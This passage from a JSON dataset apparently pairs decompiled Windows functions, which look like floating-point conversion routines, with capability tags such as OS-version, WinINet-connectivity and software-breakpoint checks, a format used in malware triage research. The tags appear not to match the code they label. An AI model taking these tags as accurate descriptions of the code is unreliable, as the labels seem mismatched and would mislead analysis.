        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e49e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4121e0 ^ &stack0xfffffffc;\n    fcn.00407d65(arg_10h);\n    var_14h = fcn.0040f621(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040eb99(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040e4f7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e537;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040e529:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e537;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040e529;\n        goto code_r0x0040e4f7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040e537:\n    fcn.0040633b(unaff_EBX);\n    return;\n}\n",
        "token_count": 509
    },
    "0040e546": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e546(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4121e0 ^ &stack0xfffffffc;\n    fcn.00407d65(arg_10h);\n    var_14h = fcn.0040f621(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040f0dd(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040e59f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e5df;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040e5d1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e5df;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040e5d1;\n        goto code_r0x0040e59f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040e5df:\n    fcn.0040633b(unaff_EBX);\n    return;\n}\n",
        "token_count": 514
    },
    "0040eb99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eb99(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040f09a;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040ecce;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040ecd5;\ncode_r0x0040ecce:\n                        do {\n                            var_4h = 1;\ncode_r0x0040ecd5:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040ece3;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040ece3:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x412d84 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x412d84 < iVar12) {\n                if (iVar12 < *0x412d80) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x412d80;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040f09a;\n            }\n            var_10h = *0x412d84 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040ee86;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040ee86:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040f09a:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3667
    },
    "0040f0dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f0dd(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040f5de;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x412da0 - 1;\n        iVar4 = *0x412da0 + (*0x412da0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x412da0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040f212;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040f219;\ncode_r0x0040f212:\n                        do {\n                            var_4h = 1;\ncode_r0x0040f219:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040f227;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040f227:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x412d9c - *0x412da0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x412d9c < iVar12) {\n                if (iVar12 < *0x412d98) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x412dac;\n                    iVar4 = *0x412da4 + (*0x412da4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x412da4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x412da4 + (*0x412da4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x412da4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x412dac + *0x412d98;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040f5de;\n            }\n            var_10h = *0x412d9c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x412da0 - 1;\n            iVar12 = *0x412da0 + (*0x412da0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x412da0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040f3ca;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040f3ca:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x412da4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040f5de:\n    var_20h = iVar12 << (0x1fU - *0x412da4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x412da8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x412da8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3645
    },
    "0040f621": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f8e3)\n// WARNING: Removing unreachable block (ram,0x0040f8ac)\n// WARNING: Removing unreachable block (ram,0x0040fc94)\n// WARNING: Removing unreachable block (ram,0x0040f8bb)\n// WARNING: Removing unreachable block (ram,0x0040f8c3)\n// WARNING: Removing unreachable block (ram,0x0040f8c9)\n// WARNING: Removing unreachable block (ram,0x0040f8cc)\n// WARNING: Removing unreachable block (ram,0x0040f8d3)\n// WARNING: Removing unreachable block (ram,0x0040f8dd)\n// WARNING: Removing unreachable block (ram,0x0040f938)\n// WARNING: Removing unreachable block (ram,0x0040f932)\n// WARNING: Removing unreachable block (ram,0x0040f93e)\n// WARNING: Removing unreachable block (ram,0x0040f95b)\n// WARNING: Removing unreachable block (ram,0x0040f95d)\n// WARNING: Removing unreachable block (ram,0x0040f965)\n// WARNING: Removing unreachable block (ram,0x0040f968)\n// WARNING: Removing unreachable block (ram,0x0040f96d)\n// WARNING: Removing unreachable block (ram,0x0040f970)\n// WARNING: Removing unreachable block (ram,0x0040fc9d)\n// WARNING: Removing unreachable block (ram,0x0040f97b)\n// WARNING: Removing unreachable block (ram,0x0040fcb4)\n// WARNING: Removing unreachable block (ram,0x0040fcbb)\n// WARNING: Removing unreachable block (ram,0x0040f986)\n// WARNING: Removing unreachable block (ram,0x0040f999)\n// WARNING: Removing unreachable block (ram,0x0040f99b)\n// WARNING: Removing unreachable block (ram,0x0040f9a8)\n// WARNING: Removing unreachable block (ram,0x0040f9ad)\n// WARNING: Removing unreachable block (ram,0x0040f9b3)\n// WARNING: Removing unreachable block (ram,0x0040f9bc)\n// WARNING: Removing unreachable block (ram,0x0040f9c3)\n// WARNING: Removing unreachable block (ram,0x0040f9db)\n// WARNING: Removing unreachable block (ram,0x0040f9ec)\n// WARNING: Removing unreachable block (ram,0x0040f9fa)\n// WARNING: Removing unreachable block (ram,0x0040fa39)\n// WARNING: Removing unreachable block (ram,0x0040fa42)\n// WARNING: Removing unreachable block (ram,0x0040fc5a)\n// WARNING: Removing unreachable block (ram,0x0040fa50)\n// WARNING: Removing unreachable block (ram,0x0040fa5a)\n// WARNING: Removing unreachable block (ram,0x0040fc75)\n// WARNING: Removing unreachable block (ram,0x0040fa67)\n// WARNING: Removing unreachable block (ram,0x0040fa6e)\n// WARNING: Removing unreachable block (ram,0x0040fa78)\n// WARNING: Removing unreachable block (ram,0x0040fa7d)\n// WARNING: Removing unreachable block (ram,0x0040fa8d)\n// WARNING: Removing unreachable block (ram,0x0040fa92)\n// WARNING: Removing unreachable block (ram,0x0040fa9c)\n// WARNING: Removing unreachable block (ram,0x0040faa1)\n// WARNING: Removing unreachable block (ram,0x0040fab3)\n// WARNING: Removing unreachable block (ram,0x0040fac0)\n// WARNING: Removing unreachable block (ram,0x0040facf)\n// WARNING: Removing unreachable block (ram,0x0040fadc)\n// WARNING: Removing unreachable block (ram,0x0040faf9)\n// WARNING: Removing unreachable block (ram,0x0040fafd)\n// WARNING: Removing unreachable block (ram,0x0040fb04)\n// WARNING: Removing unreachable block (ram,0x0040fb0d)\n// WARNING: Removing unreachable block (ram,0x0040fb10)\n// WARNING: Removing unreachable block (ram,0x0040fb21)\n// WARNING: Removing unreachable block (ram,0x0040fb2f)\n// WARNING: Removing unreachable block (ram,0x0040fb3a)\n// WARNING: Removing unreachable block (ram,0x0040fb41)\n// WARNING: Removing unreachable block (ram,0x0040fb6c)\n// WARNING: Removing unreachable block (ram,0x0040fb71)\n// WARNING: Removing unreachable block (ram,0x0040fb7c)\n// WARNING: Removing unreachable block (ram,0x0040fb85)\n// WARNING: Removing unreachable block (ram,0x0040fb8b)\n// WARNING: Removing unreachable block (ram,0x0040fb8e)\n// WARNING: Removing unreachable block (ram,0x0040fbb4)\n// WARNING: Removing unreachable block (ram,0x0040fbb9)\n// WARNING: Removing unreachable block (ram,0x0040fbbe)\n// WARNING: Removing unreachable block (ram,0x0040fbcb)\n// WARNING: Removing unreachable block (ram,0x0040fbdc)\n// WARNING: Removing unreachable block (ram,0x0040fc0d)\n// WARNING: Removing unreachable block (ram,0x0040fbe2)\n// WARNING: Removing unreachable block (ram,0x0040fc08)\n// WARNING: Removing unreachable block (ram,0x0040fbec)\n// WARNING: Removing unreachable block (ram,0x0040fc02)\n// WARNING: Removing unreachable block (ram,0x0040fbfb)\n// WARNING: Removing unreachable block (ram,0x0040fc10)\n// WARNING: Removing unreachable block (ram,0x0040fc3d)\n// WARNING: Removing unreachable block (ram,0x0040fc1a)\n// WARNING: Removing unreachable block 